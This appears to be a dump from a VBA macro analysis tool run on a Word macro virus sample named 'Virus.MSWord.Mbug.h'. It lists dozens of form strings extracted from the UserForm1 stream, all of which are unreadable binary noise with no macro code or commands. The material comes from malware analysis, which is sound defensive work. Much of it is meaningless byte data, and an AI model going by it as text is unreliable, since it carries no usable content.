`41l.3~%-s.?�&-�.?�.D�1E�9I�&-�1E�9L�1E�9L�DL�FV�N]�Xe�N]�N]�Xe�9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c!1k!1k%)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~.3~1E�iu�{{�~�ϣ��̹���赯⣟൯�̹䰧�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X3.DB9BB9BJBBJBBJBBJBBOGGOGGJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBB9BB9B9)93.D1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%91)BB9BJ9ROGGJJROGGJJROGGJBBJBBB9B9)93.+3#)3#)3#)+#+���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=99J99JJBBJBB9)9BB9JBBJBBJBBJBBJBBJBBJBBOGGOGGOGGRBJZKUOGGOGGOGGOGGOGGOGGNPTJJRBBRBBRB/V#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1t_�kka[~������}r�K[�Rcs%-s!1k!1k##X##X%-sƫ����������������fs�4En)5k!1k%-s!1k.3~&-�&-�.D�&-�,4�&-�9L�9I�.D�1E�FV�FV�Xe�N]�N]�ew�ew�N]�9L�%-s!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n!1k%-s.?�&-�%-sN]����µ������ﵯ�ew�$3�$3�~����൯�9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=<.<99JB9BJBBJBBJBBJBBOGGOGGOGGJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBBB9J99B9BB9B9)93.D)%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1-X1)B?9WB9BJBBNPTRBJOGGOGGJBBJBBB9BF-=9993.+1!!3#)5%+���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)%91)B1)BB9BB9BF-=BB9B9BJBBBB9JBBJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGJBBOGGJBBOGGJJRJJRN?V99J1)B1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1-Xsx�������%)oGF�xw�9Fc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z[[������Ɍ�����������K[�5:k!1k!1k!1k.3~.3~&-�.?�1E�&-�$3�1E�&-�9L�9L�DL�FV�FV�N]�N]�ew�ew�iu�iu�Xe�1E�)5s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~&-�&-�.3~$3�N]�~�ϵ����蛟�1E�&-�$3�N]����µ赯�fs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X1-X1)BB9BJBBJBBJBBJBBJBBJBBOGGOGGJBBJBBJBBJBBJ99B9BB9BJBBB9BB9BJBBJBBJBBJBBB9BB9B9)9<.<)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J3.D99JBBRJ9JJJRZKURBJOGGOGGJBBB9B9)99993#)3.+3#)++#���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%99)9)%9<.<<.<9)9999F-=9)99)9J9BJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGJBBJBBJBBOGGJJRJJRJ9RB/V1)B##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9t_�������[[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`%)o.?�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N%)o5:k'1YGF�ƨ���ɮ��������}��ai~)Bo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z'1Y%-s!1k.3~.?�.3~&-�.?�&-�.D�9L�9L�FV�N]�DL�N]�FV�N]�ew�ew�`b�ew�DL�9L�%-s)5s!1k!1k%)o&-�&-�AK�N]�iu͔�޵��Xe�$3�AK�xw����̹䣟����~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)B3.D99JJBBJBBJBBJBBJBBOGGJBBJBBJBBJBBJBBJ99B9BBB9J99J999)9J99B9BJBBJBBJBBJBBB9BB9B1)B)%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=B/V99JJJRJJRZKUJJRZKUJBBOGGJ99B9B9999)93.+3#)5%+���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!)9)93#)1)B=-1=-1=-1=-1=-19)9B9BF-=BB9JBBJBBJBBJBBJBBJBBRBBJBBJBBJBBJBBOGGJJR99J99J1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9t_�������GF�%)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cTZ�LY�!1k.3~������ƫ�������dt�LY�!1k19c!1k!1k%-s.3~+)�&-�.3~,4�&-�9L�1E�FV�DL�N]�Xe�N]�DL�FV�`b�ew�iu�ew�N]�1E�.D�.?�.D�.3~%)o&-�1E�DL�`b�~�ϔ��~��1E�FV���ޣ�൯�̹�~��~�ϛ��LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)%91)BB/V999JBBJBBJBBJBBOGGJBBJBBJBBJBBJBBF-=BB9F-=999991J99B9BJBBJBBBB9JBBJBBJBBB9B1)B1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X1)BB/VB/VJBBOGGJJRZKUJJRZKUJBBJBBB9B9)99993.+3#)50-���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#))!)3#)3#)3#)3#))!)=-13#)=-19)9=-1F-=B9B9)9F-=JBB9999)9BB9JBBB9BBB9JBJB9B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N}r���ް��%-s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`dt�5:k##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c���޸����������dt�41l)5k%)o%-s)5s)Bo%-s.3~.?�&-�&-�1E�9L�DL�FV�Xe�N]�ew�N]�ew�Xe�DL�`b�ew�FV�N]�1E�.D�.D�&-�.D�%-s+)�1E�AK�ew���ޔ��Xe�N]�iu�iu�iu�~��~��`b�~�ϰ��}��19J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D1)BB9BB9BJBBJBBJBBJBBRBJJBBJBBJBBJBBBB9J999)9F-=F-=9)9B9BB9BJBBRBBRBB<<?JBBB9BB9B1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)BB/VBBRJ9ROGGOGGJJRRBJOGGOGGJBBJ999999)93.+3#)5%+���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#))!)3#)3#)1%1=-13#)9913#)199<.<3.+9999)9<.<9)9<.<3.D1)B)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)<.<�����ތ��&-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9##X���LY�!1k%)o���������������LY�41l!1k%)o!1k!1k.3~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~.D�%-s,4�9L�DL�FV�FV�N]�N]�N]�Xe�TZ�N]�N]�Xe�Xe�N]�DL�Xe�1E�,4�.?�.D�.D�+)�&-�.D�AK�iuͣ�ࣟ�N]�ew�`b�{{�~��~��K[�&-�iuͣ��}��]i�##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B9)9<.<B9BJBBJBBJBBJBBJBBJBBJBBJBB9)9F-=991F-=991F-=BB9JBBJBBJBBOGGOGGRBBRBB999B9B9)91)B$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N1-X99JB/VJBJJJRZKUZKUZKUJBBOGGJBBJBB9)9<.<3.+3#)50-���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3#))!)3#)3#)3#)3#)=-13#)9913#)'&D$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)B=kܴ���ށ��.3~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Nfs�[[�)5k%)o���������ƫ͝��BMk%)o##X##X%-s)5s%-s.3~.?�.D�1E�FV�9L�DL�Xe�Xe�1E�.D�1E�1E�9I�FV�FV�FV�9L�DL�FV�DL�&-�,4�.D�&-�)5s.D�&-�AK�iu͵��~��Xe�N]�xw�ai~GF�%-s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~ew���ށ��9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D3.DB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBF-=9)9F-=F-=B9B9)9JBBJBBJBBJBBOGGOGGOGGJBBJBBB9B1)B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)BB/VB/VOGGJJRZKUJJRZKUZKUZKUJBBJBBJ999)9=-13#)5%+���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'3#))!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!LHk�����⌌�%-s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
95:k.?�##X%)oxw�������ӻ̌��LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^##X##X%)o)5k%-s.3~.D�1E�9L�K[�9L�Xe�9L�%-s+)�!1k!1k%)o%)o&-�9L�9L�FV�FV�DL�DL�.D�&-�.D�.D�.D�&-�9L�FV���؛��DL�1E�9I�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~`bǞ�ց��LY�3=T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B9)93.DJBBB9BJBBJBBJBBJBBJBBB9B9)9BB9F-=9)9991=-1J99JBBJBB<<?OGGOGGOGGOGGOGGRBB99999J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=##XJ9RB/VRBBJJRZKURBJZKUOGGOGGOGGJBBJBB=-19)93.+5%+���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)t_����������!1k!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N'1Y%)oGF�̹������ށ��9I�##X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^!1k!1k.3~+)�9I�9L�9L�9L�DL�LY�&-�%-s.?�)5s&-�.D�DL�FV�ew�DL�FV�FV�FV�1E�1E�%-s.?�.3~.D�1E�1E�iu͔��xw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z&-�~�����}��ai~19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1'&D'&D1)B1)BB9BB9BJBBJBBJBBJBBJBBBB9F-=BB9=-1F-=B9BB9BJBBJBBRBBRBBJBBOGGOGGOGGOGGJBBB9B9)91)B'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X##X99JB/VJJRRBJJJRJJRZKUZKUJBBOGGOGGJBBB9B9)93.+5%+���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!cZk������}��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J!1k%-s41l[[�������]i�19c##X##X##X!1k!1k!1k%-s.D�9L�1E�9L�9L�.?�.?�4En!1k&-�FV�Xe�TZ�DL�FV�N]�DL�Xe�TZ�Xe�9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`%)o%-s1E�Xe����µ�K[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~{{ҵ�➟ց��K[�PZm19J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%9#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=99JB9BJBBJBBJBBJBBJBBB9B9)9F-=F-=991=-19)9B9BJ99JBBJBBOGGZKUOGGOGGOGGOGGOGGOGGJBB9)91)B'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=B/VJ9RRBJOGGOGGZKUJJRZKUZKUOGGOGGJBBJ99999=-15%+���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-�o�������fs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X)5sdt�sx�LY�19c)Bo19c%-s%)o##X)5k!1k!1k)5s.3~&-�9I�9L�1E�9I�.3~!1k%-s.D�9I�1E�&-�1E�9L�K[�Xe�iu�Xe�1E�9L�9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N$3�`b�µ����4En
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n%)o.3~.D�1E�AK����µ赯➟ց��fs�BMkBMk>FX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B99JB9BB9BJBBJBBB9BB9B9)9F-=999F-=BB9J99B9BJBBJBBOGGOGGOGGOGGOGGOGGOGGOGGJBBBBRB9B99J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)BB/VJ9RBBROGGZKURBJZKURBJJJROGGOGGOGGB9B999<.<50-���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2cRk���������LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B!1k%)o%)o5:kxw����fs�9Fc'1Y'1Y'1Y%)o%)o)5k)5k)5k%-s)5s)5s.3~.D�%-s!1k'1Y##X##X'1Y!1k%)o.D�.3~19cLHk9FcK[�99{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z&-�iu����̹�)Bo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c&-�9L�N]�ew�iu͞�ֵ�⣟ࣟధʛ��K[�LY�BMkPZm3=T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B9)9B9BJBBJBBJBBB9B9)9JBBB9B9)9F-=BB9JBBJBBJBBRBBOGGOGGOGGOGGOGGOGGJBBJBBOGGJBB99J1)B)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X1-X99JJ9RRBJOGGJJROGGNPTZKUZKURBJOGGJBBJBBF-=9995%+���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9{�ӻ�ӻ����a[~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X.3~9I�t_����ӻ̦��3=T9Fc19c19c%)o%)o)5k)5k%-s)5k%-s!1k.?�5:k)5s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N1E�{{�̹䵯�LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^.3~9L�AK�ew�iu͛��~��~��~��~�ϛ��fs�ai~PZmRcsLY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B'&D1)B99JB9BB9BB9BJBBB9BB9BB9BBB9J99B9BB9BJBBJBBJBBOGGJBBZKUJBBOGGOGGOGGZKURBBRBB<<?BBRBBR1)B1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X1)B19JB/VOGGJJRRBJOGGOGGZKUZKUJBBOGGOGGJBB9)9999?/3���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9R�~�ӻ�ӻ����]i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba[~[[�������ӻ�ӻ�LY�]i�5:k5:k'1Y%-s%)o)Bo!1k!1k!1k%-s.3~!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z1E�iu�~��~��1E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~&-�9L�FV�FV�N]�~�ϵ��~��ai~dt�ai~fs�ai~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
